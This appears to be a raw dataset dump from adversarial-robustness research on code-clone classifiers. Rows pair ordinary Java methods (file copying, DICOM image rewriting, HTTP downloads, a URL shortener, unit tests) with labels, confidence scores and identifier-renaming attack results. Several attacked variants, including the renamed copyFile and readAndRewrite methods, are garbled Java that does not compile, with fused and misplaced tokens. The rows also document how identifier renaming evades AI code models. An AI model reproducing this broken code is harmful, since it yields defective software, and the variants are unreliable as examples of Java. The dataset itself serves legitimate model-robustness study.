        if (!fromFile.isFile()) abort(""can't copy directory: "" + from_name);
        if (!fromFile.canRead()) abort(""currentSourcepartName file is unreadable: "" + from_name);
        if (toFile.isDirectory()) toFile = new File(toFile, fromFile.getName());
        if (toFile.exists()) {
            if (!toFile.canWrite()) abort(""destination file is unwriteable: "" + to_name);
        } else {
            String parent = toFile.getParent();
            if (parent == null) abort(""destination directory doesn't exist: "" + parent);
            File dir = new File(parent);
            if (!dir.exists()) abort(""destination directory doesn't exist: "" + parent);
            if (dir.isFile()) abort(""destination is not a directory: "" + parent);
            if (!dir.canWrite()) abort(""destination directory is unwriteable: "" + parent);
        }
        FileInputStream from = null;
        FileOutputStream to = null;
        try {
            from = new FileInputStream(fromFile);
            to = new FileOutputStream(toFile);
            byte[] buffer = new byte[4096];
            int bytes_read;
            while ((bytes_read = from.read(buffer)) != -1) to.write(buffer, 0, bytes_read);
        } finally {
            if (from != null) try {
                from.close();
            } catch (IOException e) {
                ;
            }
            if (to != null) try {
                to.close();
            } catch (IOException e) {
                ;
            }
        }
    }
",1317,,LABEL_1,LABEL_1,LABEL_1,-1,"reader,ks,key,chain,os,stamper,appearance",,,,0,,0,GA,2171,1.030501699447632,failed,[]
165,"    protected void doSetInput(IEditorInput input, IProgressMonitor monitor) throws CoreException {
        IWorkspaceRoot root = ResourcesPlugin.getWorkspace().getRoot();
        IFileFormat format = null;
        Object source = null;
        InputStream in = null;
        try {
            IPath path;
            if (input instanceof IStorageEditorInput) {
                IStorage s = ((IStorageEditorInput) input).getStorage();
                in = s.getContents();
                if (s instanceof IFile) {
                    IFile file = (IFile) s;
                    path = file.getRawLocation();
                    if (root.exists(path)) {
                        path = root.getLocation().append(path);
                    }
                    source = path.toFile();
                }
            } else if (input instanceof IPathEditorInput) {
                path = ((IPathEditorInput) input).getPath();
                source = path.toFile();
            } else if (input instanceof IURIEditorInput) {
                URI uri = ((IURIEditorInput) input).getURI();
                if (URIUtil.isFileURI(uri)) {
                    source = URIUtil.toFile(uri);
                } else {
                    URL url = URIUtil.toURL(uri);
                    in = url.openStream();
                }
            }
            if (source == null) {
                if (!in.markSupported()) {
                    in = new BufferedInputStream(in);
                }
                in.mark(10);
                source = in;
            }
            IContentDescription cd = Platform.getContentTypeManager().getDescriptionFor(in, input.getName(), new QualifiedName[] { ImageCore.VALID_FORMATS });
            if (in != null) {
                in.reset();
            }
            Collection<?> valid = (Collection<?>) cd.getProperty(ImageCore.VALID_FORMATS);
            if (valid.isEmpty()) throw new CoreException(new Status(Status.ERROR, ImageUI.PLUGIN_ID, ""Unsupported file format.""));
            ImageInputStream stream = ImageIO.createImageInputStream(source);
            format = (IFileFormat) valid.iterator().next();
            IDocument document = format.decode(stream, monitor);
            setDocument(document);
        } catch (IOException e) {
            Status status = new Status(Status.ERROR, ImageUI.PLUGIN_ID, ""IO Error"", e);
            throw new CoreException(status);
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                }
            }
        }
        super.setInput(input);
    }
 <SPLIT>     public int updateuser(User u) {
        int i = 0;
        Connection conn = null;
        PreparedStatement pm = null;
        try {
            conn = Pool.getConnection();
            conn.setAutoCommit(false);
            pm = conn.prepareStatement(""update user set username=?,passwd=?,existstate=?,management=? where userid=?"");
            pm.setString(1, u.getUsername());
            pm.setString(2, u.getPasswd());
            pm.setInt(3, u.getExiststate());
            pm.setInt(4, u.getManagement());
            pm.setString(5, u.getUserid());
            i = pm.executeUpdate();
            conn.commit();
            Pool.close(pm);
            Pool.close(conn);
        } catch (Exception e) {
            e.printStackTrace();
            try {
                conn.rollback();
            } catch (SQLException e1) {
                e1.printStackTrace();
            }
            Pool.close(pm);
            Pool.close(conn);
        } finally {
            Pool.close(pm);
            Pool.close(conn);
        }
        return i;
    }
",472,,LABEL_0,LABEL_0,LABEL_0,-1,"doSetInput,input,monitor,root,format,source,in,path,s,file,uri,url,cd,valid,stream,document",,,,0,,0,GA,5993,2.2990543365478517,failed,[]
166,"    private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
 <SPLIT>     private void copyFile(final String sourceFileName, final File path) throws IOException {
        final File source = new File(sourceFileName);
        final File destination = new File(path, source.getName());
        FileChannel srcChannel = null;
        FileChannel dstChannel = null;
        try {
            srcChannel = new FileInputStream(source).getChannel();
            dstChannel = new FileOutputStream(destination).getChannel();
            dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
        } finally {
            try {
                if (dstChannel != null) {
                    dstChannel.close();
                }
            } catch (Exception exception) {
            }
            try {
                if (srcChannel != null) {
                    srcChannel.close();
                }
            } catch (Exception exception) {
            }
        }
    }
",272,"    private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream ciris = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcdcmParser DcmParserFactory.getInstance().newDcmParser(ciris);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdpdReader pdFact.newReader(dsdsciris, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.url.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream url = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(url, dcmEncParam);
        ds.writeHeader(url, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.url.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, url, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        url.flush();
        url.close();
        System.url.println(""done!"");
    }
",LABEL_1,LABEL_1,0.8243053555488586,1,"readAndRewrite,inFile,outFile,iis,dcmParser,ds,pdReader,out,dcmEncParam,pdWriter",,,,30,"readAndRewrite:readAndRewrite,inFile:inFile,outFile:outFile,iis:ciris,dcmParser:dcmParser,ds:ds,pdReader:pdReader,out:url,dcmEncParam:dcmEncParam,pdWriter:pdWriter,",8,GA,552,0.20344186623891194,ga,[]
167,"    @SuppressWarnings(""unchecked"")
    public List<Event> lookupFutureEvents(String groupIdentifier) throws GtugsException {
        StringBuilder json = new StringBuilder();
        String requestUrl = ""http://api.meetup.com/events.json/?group_urlname="" + groupIdentifier + ""&key="" + key;
        try {
            URL url = new URL(requestUrl.toString());
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                json.append(inputLine);
            }
            in.close();
        } catch (IOException e) {
            throw new GtugsException(e);
        }
        List<Event> events = new ArrayList<Event>();
        JSONObject jsonObj = (JSONObject) JSONValue.parse(json.toString());
        JSONArray results = (JSONArray) jsonObj.get(""results"");
        for (int i = 0; i < results.size(); i++) {
            JSONObject result = (JSONObject) results.get(i);
            Event e = new Event();
            e.setAttendeeCount(Integer.parseInt((String) result.get(""rsvpcount"")));
            e.setCity((String) result.get(""venue_city""));
            e.setDescription((String) result.get(""description""));
            e.setLatitude(Double.parseDouble((String) result.get(""venue_lat"")));
            e.setLongitude(Double.parseDouble((String) result.get(""venue_lon"")));
            e.setName((String) result.get(""name""));
            Date myDate = null;
            String time = (String) result.get(""time"");
            try {
                myDate = meetupDateFormat.parse(time);
                e.setStartTime(timeDateFormat.format(myDate));
                e.setEndTime(timeDateFormat.format(myDate));
                e.setStartDate(myDate);
                e.setEndDate(myDate);
                String tz = tzDateFormat.format(myDate);
                if (tz != null && tz.startsWith(""+"")) {
                    tz = tz.substring(1);
                }
                e.setTimeZone(Integer.toString(Integer.parseInt(tz) / 100));
            } catch (ParseException ex) {
                ex.printStackTrace();
                continue;
            }
            e.setState((String) result.get(""venue_state""));
            StringBuilder addressBuilder = new StringBuilder();
            if (result.get(""venue_address1"") != null) {
                addressBuilder.append((String) result.get(""venue_address1"") + "" "");
            }
            if (result.get(""venue_address2"") != null) {
                addressBuilder.append((String) result.get(""venue_address2"") + "" "");
            }
            if (result.get(""venue_address3"") != null) {
                addressBuilder.append((String) result.get(""venue_address3"") + "" "");
            }
            if (result.get(""venue_address4"") != null) {
                addressBuilder.append((String) result.get(""venue_address4""));
            }
            e.setStreetAddress(addressBuilder.toString().trim());
            e.setZipCode((String) result.get(""venue_zip""));
            e.setUrl((String) result.get(""event_url""));
            events.add(e);
        }
        return events;
    }
 <SPLIT>     private String getPrefsKey(String key) {
        try {
            if (MD5 == null) MD5 = MessageDigest.getInstance(""MD5"");
            MD5.reset();
            MD5.update(key.getBytes(""UTF-8""));
            byte[] resultBytes = MD5.digest();
            return toHexString(resultBytes);
        } catch (Exception nsae) {
            return key;
        }
    }
",692,,LABEL_0,LABEL_0,LABEL_0,-1,"lookupFutureEvents,groupIdentifier,json,requestUrl,url,in,inputLine,events,jsonObj,results,i,result,e,myDate,time,tz",,,,0,,0,GA,5825,2.306008529663086,failed,[]
168,"    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String rewrittenQueryString = URLDecoder.decode(request.getRequestURI(), ""UTF-8"").replaceFirst(""^.*?\\/(id:.*)\\/.*?$"", ""$1"");
        logger.debug(""rewrittenQueryString: "" + rewrittenQueryString);
        URL rewrittenUrl = new URL(fedoraUrl + rewrittenQueryString);
        logger.debug(""rewrittenUrl: "" + rewrittenUrl.getProtocol() + ""://"" + rewrittenUrl.getHost() + "":"" + rewrittenUrl.getPort() + rewrittenUrl.getFile());
        HttpURLConnection httpURLConnection = (HttpURLConnection) rewrittenUrl.openConnection();
        HttpURLConnection.setFollowRedirects(false);
        httpURLConnection.connect();
        response.setStatus(httpURLConnection.getResponseCode());
        logger.debug(""[status="" + httpURLConnection.getResponseCode() + ""]"");
        logger.debug(""[headers]"");
        for (Entry<String, List<String>> header : httpURLConnection.getHeaderFields().entrySet()) {
            if (header.getKey() != null) {
                for (String value : header.getValue()) {
                    if (value != null) {
                        logger.debug(header.getKey() + "": "" + value);
                        if (!header.getKey().equals(""Server"") && !header.getKey().equals(""Transfer-Encoding"")) {
                            response.addHeader(header.getKey(), value);
                        }
                    }
                }
            }
        }
        logger.debug(""[/headers]"");
        InputStream inputStream = httpURLConnection.getInputStream();
        OutputStream outputStream = response.getOutputStream();
        IOUtils.copy(inputStream, outputStream);
    }
 <SPLIT>     private static void loadDefaultPreferences() {
        try {
            URL url = ClassLoader.getSystemResource(""OpenDarkRoom.defaults.properties"");
            preferences.load(url.openStream());
        } catch (FileNotFoundException e) {
            log.error(""Default preferences file not found"");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
",335,,LABEL_0,LABEL_0,LABEL_0,-1,"doGet,request,response,rewrittenQueryString,rewrittenUrl,httpURLConnection,header,value,inputStream,outputStream",,,,0,,0,GA,3797,1.3909562667210897,failed,[]
169,"        private void downloadFile(final String downloadUrl, final String destinationFile) throws IOException {
            HttpClient client = new DefaultHttpClient();
            HttpGet httpGet = new HttpGet(downloadUrl);
            final File outputFile = new File(destinationFile);
            createParentDirectories(outputFile);
            FileOutputStream outputStream;
            outputStream = new FileOutputStream(outputFile);
            final HttpResponse response = client.execute(httpGet);
            if (isInterrupted()) {
                outputStream.close();
                return;
            }
            final HttpEntity entity = response.getEntity();
            InputStream inputStream = null;
            try {
                if (entity != null) {
                    inputStream = entity.getContent();
                    CopyStreamStatusCallback callback = new CopyStreamStatusCallback() {

                        @Override
                        public long getSkipBetweenUpdates() {
                            return entity.getContentLength() * 2 / PERCENTAGE_BASE;
                        }

                        @Override
                        public void onUpdate(final long copiedLength) {
                            int percentage = (int) (copiedLength * PERCENTAGE_BASE / entity.getContentLength());
                            handleUpdate(STATUS_DOWNLOADING, percentage);
                        }
                    };
                    copyStreams(inputStream, outputStream, callback);
                }
            } finally {
                try {
                    outputStream.close();
                    if (inputStream != null) {
                        inputStream.close();
                    }
                } catch (IOException e) {
                    Log.v(DictionaryForMIDs.LOG_TAG, ""Exception while closing stream: "" + e);
                }
            }
        }
 <SPLIT>     public static void copyFileChannel(File src, File dst, boolean preserveModificationTime) throws IOException {
        FileChannel inputChannel = null;
        FileChannel outputChannel = null;
        long length = 0;
        try {
            inputChannel = new FileInputStream(src).getChannel();
            length = inputChannel.size();
            outputChannel = new FileOutputStream(dst).getChannel();
            long total = 0;
            while (total < length) {
                total += inputChannel.transferTo(0, length, outputChannel);
            }
            if (preserveModificationTime) {
                dst.setLastModified(src.lastModified());
            }
        } finally {
            if (inputChannel != null) {
                inputChannel.close();
            }
            if (outputChannel != null) {
                outputChannel.close();
            }
        }
    }
",245,"        private void copyFile(final String downloadUrl, final String destinationFILE) throws IOException {
            HttpClient url = new DefaultHttpClient();
            HttpGet httpGet = new HttpGet(downloadUrl);
            final File outputFile = new File(destinationFILE);
            createParentDirectories(outputFile);
            FileOutputStream outputStreamer;
            outputStreamer = new FileOutputStream(outputFile);
            final HttpResponrequestnse = url.execute(httpGet);
            if (isInterrupted()) {
                outputStreamer.close();
                return;
            }
            final HttpEntityentityy = request.getEntity();
            InputStream childStream = null;
            try {
                if (entity != null) {
                    childStream = entity.getContent();
                    CopyStreamStatusCallback callback = new CopyStreamStatusCallback() {

                        @Override
                        public long getSkipBetweenUpdates() {
                            return entity.getContentLength() * 2 / PERCENTAGE_BASE;
                        }

                        @Override
                        public void onUpdate(final long copiedLength) {
                            int percentage = (int) (copiedLength * PERCENTAGE_BASE / entity.getContentLength());
                            handleUpdate(STATUS_DOWNLOADING, percentage);
                        }
                    };
                    copyStreams(inchildStreamoutputStreamer, callback);
                }
            } finally {
                try {
                    outputStreamer.close();
                    if (childStream != null) {
                        childStream.close();
                    }
                } catch (IOException e) {
                    Log.v(DictionaryForMIDs.LOG_TAG, ""Exception while closing stream: "" + e);
                }
            }
        }
",LABEL_0,LABEL_0,0.5865814685821533,1,"downloadFile,downloadUrl,destinationFile,client,httpGet,outputFile,outputStream,response,entity,inputStream,callback,copiedLength,percentage",,,,18,"downloadFile:copyFile,downloadUrl:downloadUrl,destinationFile:destinationFILE,client:url,httpGet:httpGet,outputFile:outputFile,outputStream:outputStreamer,response:request,entity:entity,inputStream:childStream,callback:callback,copiedLength:copiedLength,percentage:percentage,",7,GA,507,0.18983509143193564,ga,[]
170,"    @Override
    public InputStream getResourceByClassName(String className) {
        URL url = resourceFetcher.getResource(""/fisce_scripts/"" + className + "".class"");
        if (url == null) {
            return null;
        } else {
            try {
                return url.openStream();
            } catch (IOException e) {
                return null;
            }
        }
    }
 <SPLIT>     public void writeData(String name, int items, int mzmin, int mzmax, long tstart, long tdelta, int[] peaks) {
        PrintWriter file = getWriter(name + "".txt"");
        file.print(""Filename\t"");
        file.print(""Date\t"");
        file.print(""Acquisition #\t"");
        file.print(""�m Diameter\t"");
        for (int i = mzmin; i <= mzmax; i++) file.print(i + ""\t"");
        file.println();
        int nothing = 0;
        String fileLoc = ""C:/abcd/"" + name + "".txt\t"";
        Date tempDate;
        for (int i = 0; i < items; i++) {
            tempDate = new Date(tstart);
            tstart += tdelta;
            file.print(fileLoc);
            file.print(dateFormat.format(tempDate) + ""\t"");
            file.print(i + 1 + ""\t"");
            double t = (double) (i) / 10;
            file.print(t + ""\t"");
            boolean peaked = false;
            for (int k = mzmin; k <= mzmax; k++) {
                for (int j = 0; j < peaks.length && !peaked; j++) {
                    if (k == peaks[j]) {
                        file.print(peakVals[j % peakVals.length] + ""\t"");
                        peaked = true;
                    }
                }
                if (!peaked) {
                    if (k == mzmax) file.print(nothing); else file.print(nothing + ""\t"");
                }
                peaked = false;
            }
            file.println();
        }
        try {
            Scanner test = new Scanner(f);
            while (test.hasNext()) {
                System.out.println(test.nextLine());
            }
            System.out.println(""test"");
        } catch (Exception e) {
        }
        file.close();
    }
",64,"    @Override
    public InputStream getResourceByFileName(String  classType) {
        URL uref= resourceFetcher.getResource(""/fisce_scripts/"" +  classType + "".class"");
        if (ref == null) {
            return null;
        } else {
            try {
                return ref.openStream();
            } catch (IOException e) {
                return null;
            }
        }
    }
",LABEL_0,LABEL_0,0.6209283471107483,1,"getResourceByClassName,className,url",,,,0,"getResourceByClassName:getResourceByFileName,className: classType,url:ref,",0,GA,148,0.054292607307434085,ga,[]
171,"    public String shorten(String url) {
        List<NameValuePair> qparams = new ArrayList<NameValuePair>();
        qparams.add(new BasicNameValuePair(""version"", ""2.0.1""));
        qparams.add(new BasicNameValuePair(""longUrl"", url));
        if (login != null) {
            qparams.add(new BasicNameValuePair(""login"", login));
            qparams.add(new BasicNameValuePair(""apiKey"", apiKey));
            qparams.add(new BasicNameValuePair(""history"", ""1""));
        }
        try {
            BasicHttpParams params = new BasicHttpParams();
            DefaultHttpClient httpclient = new DefaultHttpClient(params);
            URI uri = URIUtils.createURI(""http"", ""api.j.mp"", -1, ""/shorten"", URLEncodedUtils.format(qparams, ""UTF-8""), null);
            HttpGet httpget = new HttpGet(uri);
            if (logger.isDebugEnabled()) logger.debug(""HttpGet.uri={}"", httpget.getURI());
            HttpResponse response = httpclient.execute(httpget);
            HttpEntity entity = response.getEntity();
            if (entity != null) {
                InputStream instream = entity.getContent();
                JsonFactory f = new JsonFactory();
                JsonParser jp = f.createJsonParser(instream);
                JmpShortenResponse responseObj = new JmpShortenResponse();
                for (; ; ) {
                    JsonToken token = jp.nextToken();
                    String fieldname = jp.getCurrentName();
                    if (logger.isDebugEnabled()) logger.debug(""Token={}, currentName={}"", token, fieldname);
                    if (token == JsonToken.START_OBJECT) {
                        continue;
                    }
                    if (token == JsonToken.END_OBJECT) {
                        break;
                    }
                    if (""errorCode"".equals(fieldname)) {
                        token = jp.nextToken();
                        responseObj.setErrorCode(jp.getIntValue());
                    } else if (""errorMessage"".equals(fieldname)) {
                        token = jp.nextToken();
                        responseObj.setErrorMessage(jp.getText());
                    } else if (""statusCode"".equals(fieldname)) {
                        token = jp.nextToken();
                        responseObj.setStatusCode(jp.getText());
                    } else if (""results"".equals(fieldname)) {
                        Map<String, ShortenedUrl> results = parseResults(jp);
                        responseObj.setResults(results);
                    } else {
                        throw new IllegalStateException(""Unrecognized field '"" + fieldname + ""'!"");
                    }
                }
                Map<String, ShortenedUrl> results = responseObj.getResults();
                if (results == null) {
                    return null;
                }
                ShortenedUrl shortened = results.get(url);
                if (shortened == null) {
                    return null;
                }
                if (logger.isDebugEnabled()) logger.debug(""JmpShortenResponse: {}"", responseObj);
                if (""OK"".equals(responseObj.getStatusCode())) {
                    return shortened.getShortUrl();
                }
                if (logger.isWarnEnabled()) logger.warn(""JmpShortenResponse: {}"", responseObj);
            }
        } catch (IOException ex) {
            if (logger.isWarnEnabled()) logger.warn(""Exception!"", ex);
        } catch (URISyntaxException ex) {
            if (logger.isWarnEnabled()) logger.warn(""Exception!"", ex);
        }
        return null;
    }
 <SPLIT>     private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
",644,,LABEL_0,LABEL_0,LABEL_0,-1,"shorten,url,qparams,params,httpclient,uri,httpget,response,entity,instream,f,jp,responseObj,token,fieldname",,,,0,,0,GA,5369,2.1641276915868124,failed,[]
172,"    private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
 <SPLIT>     public void testReadHelloWorldTxt() throws Exception {
        final InputStream helloWorldIS = this.getClass().getClassLoader().getResourceAsStream(BASE_DIR + ""/HelloWorld.txt"");
        FileUtils.forceMkdir(new File(this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver""));
        final String helloWorldPath = this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver/HelloWorld.txt"";
        final FileOutputStream fileOutputStream = new FileOutputStream(new File(helloWorldPath));
        IOUtils.copy(helloWorldIS, fileOutputStream);
        IOUtils.closeQuietly(helloWorldIS);
        IOUtils.closeQuietly(fileOutputStream);
        LOG.info(""helloWorldPath: "" + helloWorldPath);
        final FSContentResolver contentResolver = new FSContentResolver();
        contentResolver.setRootFolderPath(this.testDir.getAbsolutePath());
        byte[] content = contentResolver.getContent(""org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:laksjdhalksdhfa"");
        assertNull(content);
        content = contentResolver.getContent(""/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
    }
",272,"    private static void readAndRewrite(File inFilename, File processFile) throws IOException {
        ImageInputStream iis  irismageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFilename)));
        DcmParser dc dcmLanguage DcmParserFactory.getInstance().newDcmParser( iris);
        Dataset gd = DcmObjectFactory.getInstance().newDataset();
         dcmLanguage.setDcmHandler(gd.getDcmHandler());
         dcmLanguage.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReaderpdReadert.newReader(ds,  irigd  dcmLanguage.getDcmDecodeParam().byteOrder,  dcmLanguage.getReadVR());
        System.out.urlntln(""reading "" + inFilename + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out urlmageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(processFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        gd.writeDataset(url, dcmEncParam);
        ds.wrigdHeader(out, durlncdcmEncParam.PixelData,  dcmLanguage.getReadVR(),  dcmLanguage.getReadLength());
        System.out.urlntln(""writing "" + processFile + ""..."");
        PixelDataWriter pdWritdpReaderact.newWriter(pdReadpdReaderxelDataArray(), false, ds, ougd  urlLanguage.getDcmDecodeParam().byteOrder,  dcmLanguage.getReadVR());
        dpReader.writePixelData();
        url.flush();
        url.close();
        System.url.println(""done!"");
    }
",LABEL_1,LABEL_1,0.5413196682929993,1,"readAndRewrite,inFile,outFile,iis,dcmParser,ds,pdReader,out,dcmEncParam,pdWriter",,,,7,"readAndRewrite:readAndRewrite,inFile:inFilename,outFile:processFile,iis: iris,dcmParser: dcmLanguage,ds:gd,pdReader:pdReader,out:url,dcmEncParam:dcmEncParam,pdWriter:dpReader,",3,GA,784,0.29657806158065797,ga,[]
173,"    public void testCodingEmptyFile() throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        WritableByteChannel channel = newChannel(baos);
        HttpParams params = new BasicHttpParams();
        SessionOutputBuffer outbuf = new SessionOutputBufferImpl(1024, 128, params);
        HttpTransportMetricsImpl metrics = new HttpTransportMetricsImpl();
        LengthDelimitedEncoder encoder = new LengthDelimitedEncoder(channel, outbuf, metrics, 16);
        encoder.write(wrap(""stuff;""));
        File tmpFile = File.createTempFile(""testFile"", ""txt"");
        FileOutputStream fout = new FileOutputStream(tmpFile);
        OutputStreamWriter wrtout = new OutputStreamWriter(fout);
        wrtout.flush();
        wrtout.close();
        FileChannel fchannel = new FileInputStream(tmpFile).getChannel();
        encoder.transfer(fchannel, 0, 20);
        encoder.write(wrap(""more stuff""));
        String s = baos.toString(""US-ASCII"");
        assertTrue(encoder.isCompleted());
        assertEquals(""stuff;more stuff"", s);
        tmpFile.delete();
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
